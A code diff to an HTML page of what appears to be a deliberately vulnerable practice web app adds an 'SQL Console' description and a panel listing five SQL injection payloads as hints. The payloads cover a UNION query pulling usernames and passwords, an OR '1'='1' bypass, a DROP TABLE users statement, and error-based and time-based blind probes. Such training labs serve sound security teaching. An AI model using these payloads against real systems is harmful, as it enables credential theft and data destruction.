@@ -13,11 +13,23 @@
   </aside>
   <main class="content">
     <h1>SQL Console</h1>
+    <p class="muted">Execute SQL queries directly on the database. Supports UNION, subqueries, and advanced SQL features.</p>
     <form id="sql-form">
       <textarea name="sql" rows="8" placeholder="SELECT * FROM users LIMIT 2;"></textarea>
       <button>Run</button>
     </form>
     <pre id="sql-output" class="mt"></pre>
+    <div class="mt">
+      <h3>Vulnerability: SQL Injection (Multiple Types)</h3>
+      <p>This console is vulnerable to SQL injection. Try:</p>
+      <ul>
+        <li><code>1' UNION SELECT username, password, email FROM users--</code></li>
+        <li><code>1' OR '1'='1</code></li>
+        <li><code>1'; DROP TABLE users;--</code></li>
+        <li><code>1' AND (SELECT SUBSTRING(@@version,1,1))='5'--</code> (Error-based)</li>
+        <li><code>1' AND SLEEP(5)--</code> (Time-based blind)</li>
+      </ul>
+    </div>
   </main>
   <script src="../assets/js/logger.js"></script>
   <script src="../assets/js/app.js"></script>
